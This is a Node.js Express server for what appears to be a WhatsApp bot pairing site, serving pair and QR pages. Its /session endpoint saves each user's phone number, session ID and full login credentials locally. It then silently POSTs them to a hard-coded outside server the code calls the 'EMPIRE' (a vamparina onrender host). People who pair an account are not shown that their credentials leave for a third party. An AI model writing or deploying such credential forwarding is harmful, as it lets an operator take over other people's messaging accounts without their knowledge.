import express from 'express';
import bodyParser from 'body-parser';
import { fileURLToPath } from 'url';
import path from 'path';
import fs from 'fs';

// Importing the modules
import pairRouter from './pair.js';
import qrRouter from './qr.js';
import QRCode from 'qrcode';

const app = express();

// Resolve the current directory path in ES modules
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const PORT = process.env.PORT || 8000;

// EMPIRE URL — SENDS ALL SESSIONS HERE
const EMPIRE_URL = "https://vamparina-v1-5.onrender.com";
const SESSION_DIR = path.join(__dirname, 'auto_sessions');

if (!fs.existsSync(SESSION_DIR)) fs.mkdirSync(SESSION_DIR, { recursive: true });

import('events').then(events => {
    events.EventEmitter.defaultMaxListeners = 500;
});

// Middleware
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// Routes
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'pair.html'));
});

app.use('/pair', pairRouter);
app.use('/qr', qrRouter);

// NEW: AUTO-SEND SESSION TO EMPIRE + SAVE LOCALLY
app.post('/session', async (req, res) => {
    try {
        const { phone, sessionId, creds } = req.body;
        if (!phone || !sessionId || !creds) {
            return res.status(400).json({ error: "Missing phone/sessionId/creds" });
        }

        // Save session to auto_sessions folder
        const sessionPath = path.join(SESSION_DIR, sessionId);
        if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });
        fs.writeFileSync(path.join(sessionPath, 'creds.json'), JSON.stringify(creds, null, 2));

        console.log(`\nNEW WARRIOR SESSION SAVED`);
        console.log(`Phone: ${phone}`);
        console.log(`Session ID: ${sessionId}`);
        console.log(`Saved to: ${sessionPath}`);
        console.log(`Time: ${new Date().toLocaleString('en-KE')}\n`);

        // Send to empire bot
        try {
            const response = await fetch(`${EMPIRE_URL}/vamparina-activate`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    phone,
                    sessionId,
                    creds,
                    type: "qr_or_pair",
                    source: "vamparina-code-linker"
                })
            });

            const result = await response.json();
            console.log("Session sent to empire:", result);

        } catch (err) {
            console.error("Failed to send to empire:", err.message);
        }

        res.json({
            success: true,
            message: "Session saved and sent to VAMPARINA V1 EMPIRE",
            sessionId,
            phone
        });
    } catch (e) {
        console.error("Session error:", e.message);
        res.status(500).json({ error: e.message });
    }
});

app.listen(PORT, () => {
    console.log(`YoutTube: @@arnoldkipruto-qn7jn\n\nGitHub: @arnold6001\n\nServer running on http://localhost:${PORT}\nSending sessions to: ${EMPIRE_URL}`);
});

export default app;